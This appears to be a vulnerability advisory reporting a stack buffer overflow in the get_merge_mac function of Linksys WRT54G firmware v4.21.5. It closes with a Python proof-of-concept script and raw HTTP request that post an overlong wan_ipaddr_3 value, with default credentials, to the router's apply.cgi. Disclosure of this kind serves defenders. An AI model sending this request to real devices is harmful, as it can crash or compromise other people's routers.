# Overview
Firmware download website: [https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.5](https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.5)
[https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.8](https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.8)

# Affected version
Linksys WRT54G Firmware v4.21.5
# Vulnerability details
The Linksys WRT54G Firmware v4.21.5 has a stack overflow vulnerability in get_merge_mac function. The variable `wan_ipaddr_%d`receives the parameter from a POST request.  In line 15, the stract function will merge it with the variable a2. It is important to note that in the calling function, the a2 variable is stack-allocated and has a size of only 24 characters. If the variable exceeds this length, it can result in a buffer overflow vulnerability, potentially leading to remote code execution or denial-of-service attacks.  
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723521727425-1957b2ba-9c9f-41d8-8963-76fe8c56665f.png#averageHue=%23fdfdfb&clientId=ub288f58f-c669-4&from=paste&height=261&id=u99def465&originHeight=441&originWidth=807&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=36998&status=done&style=none&taskId=u2e84555d-1993-4576-b80f-0073081d4bd&title=&width=477.33331298828125)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723521761103-57d645c2-fb74-4cfd-a2a3-18f94747b6cc.png#averageHue=%23fcfcfb&clientId=ub288f58f-c669-4&from=paste&height=451&id=ubf5700a3&originHeight=732&originWidth=715&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=84978&status=done&style=none&taskId=ud54a6890-036f-40e6-9df0-09bc09bdd27&title=&width=440.5555419921875)
# POC
```python
import requests

url = 'http://192.168.1.1/apply.cgi'
headers = {
    'Host': '192.168.1.1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://192.168.1.1',
    'Authorization': 'Basic OmFkbWlu',
    'Connection': 'close',
    'Referer': 'http://192.168.1.1/WanMAC.asp',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=1',
}

payload = ('submit_button=WanMAC&change_action=&submit_type=&action=Apply&wan_proto=1&wan_ipaddr=3&wan_ipaddr_0=1.1.1.1&wan_ipaddr_1=2.2.2.2&wan_ipaddr_3=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&wan_netmask=2.2.2.2')

response = requests.post(url, headers=headers, data=payload)

print('Status:', response.status_code)
print('Response:', response.text)

```
```c
POST /apply.cgi HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 197
Origin: http://192.168.1.1
Authorization: Basic OmFkbWlu
Connection: close
Referer: http://192.168.1.1/WanMAC.asp
Upgrade-Insecure-Requests: 1
Priority: u=1

submit_button=WanMAC&change_action=&submit_type=&action=Apply&wan_proto=1&wan_ipaddr=3&wan_ipaddr_0=1.1.1.1&wan_ipaddr_1=2.2.2.2&wan_ipaddr_3=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&wan_netmask=2.2.2.2
```
